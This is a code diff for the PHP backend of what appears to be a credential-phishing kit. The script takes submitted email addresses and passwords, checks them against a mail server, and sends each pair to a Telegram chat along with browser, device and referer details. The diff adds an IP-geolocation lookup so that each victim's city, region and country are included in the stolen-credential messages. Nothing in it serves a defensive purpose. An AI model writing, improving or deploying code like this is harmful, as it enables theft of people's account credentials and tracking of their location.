@@ -1,12 +1,10 @@
 <?php
-ob_start(); // start buffer
 header("Access-Control-Allow-Origin: *");
 header("Access-Control-Allow-Methods: POST");
 header("Access-Control-Allow-Headers: Content-Type");
 
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
-ob_clean();
 header('Content-Type: application/json; charset=utf-8');
 
 function sendToTelegram($message) {
@@ -53,6 +51,33 @@ function msg($key, $lang, $messages) {
     return $messages[$lang][$key] ?? $messages['en'][$key];
 }
 
+// -------------------- User location function --------------------
+function getUserLocation() {
+    $ip = $_SERVER['HTTP_CLIENT_IP'] 
+        ?? $_SERVER['HTTP_X_FORWARDED_FOR'] 
+        ?? $_SERVER['REMOTE_ADDR'] 
+        ?? 'Unknown';
+
+    $locationText = "Unknown Location";
+
+    if ($ip !== 'Unknown') {
+        $url = "http://ip-api.com/json/{$ip}?fields=country,regionName,city,query";
+        $data = @file_get_contents($url);
+        if ($data) {
+            $loc = json_decode($data, true);
+            if (is_array($loc)) {
+                $city       = $loc['city']       ?? 'Unknown City';
+                $region     = $loc['regionName'] ?? 'Unknown Region';
+                $country    = $loc['country']    ?? 'Unknown Country';
+                $queryIP    = $loc['query']      ?? $ip;
+                $locationText = "$city, $region, $country (IP: $queryIP)";
+            }
+        }
+    }
+
+    return $locationText;
+}
+
 $response = ["status" => "error", "message" => msg('unknown_error', 'en', $messages)]; 
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
@@ -69,6 +94,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $userAgent = safe($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown');
     $referer   = safe($_SERVER['HTTP_REFERER'] ?? 'Direct');
     $language  = safe($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown');
+
+    // Get user location
+    $locationText = getUserLocation();
 
     // Email validation
     if (!$email) {
@@ -98,6 +126,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         sendToTelegram("❌ Connection Failed
 📧 Email: $email
 🔑 Password: $password
+🌍 Location: $locationText
 🖥️ Browser: $browser_info
 📱 Device: $device_info
 ↪️ Referer: $referer
@@ -124,6 +153,7 @@ Error: $errstr ($errno)");
             sendToTelegram("✅ Login Successful
 📧 Email: $email
 🔑 Password: $password
+🌍 Location: $locationText
 🖥️ Browser: $browser_info
 📱 Device: $device_info
 ↪️ Referer: $referer
@@ -136,6 +166,7 @@ Error: $errstr ($errno)");
             sendToTelegram("❌ Login Failed
 📧 Email: $email
 🔑 Password: $password
+🌍 Location: $locationText
 🖥️ Browser: $browser_info
 📱 Device: $device_info
 ↪️ Referer: $referer
@@ -153,4 +184,3 @@ Response: " . safe($smtpResponse));
 
 echo json_encode($response);
 ?>
-
